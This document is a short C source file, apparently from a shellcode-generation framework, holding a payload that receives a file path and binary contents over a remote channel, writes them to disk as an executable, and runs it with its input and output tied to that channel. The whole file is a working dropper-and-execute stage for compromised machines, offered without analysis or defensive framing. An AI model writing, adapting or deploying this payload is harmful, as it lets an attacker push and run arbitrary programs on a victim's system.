#include <factory.h>
#include "helpers/io.c"
#include "helpers/memory.c"
#include "helpers/socket.c"
#include "helpers/process.c"

SHELLCODE_ENTRY {

    struct channel chan = get_communication_channel();
    unsigned int file_sz;
    char file_path[256];
    void *file_contents;

    /* Read the path. */
    channel_recv(chan, file_path, sizeof(file_path));

    /* Read the file size. */
    channel_recv(chan, &file_sz, sizeof(file_sz));
    
    /* Read the file data. */
    file_contents = _malloc(file_sz);
    channel_recv(chan, file_contents, file_sz);

    /* Drop executable file. */
    drop_file(file_path, S_IRUSR | S_IWUSR | S_IXUSR, file_contents, file_sz); 

    char *const argv[] = { "/tmp/bash", NULL };
    char *const envp[] = { NULL };

    /* Execute the dropped executable. */
    execute(file_path, argv, envp, chan);

} SHELLCODE_END
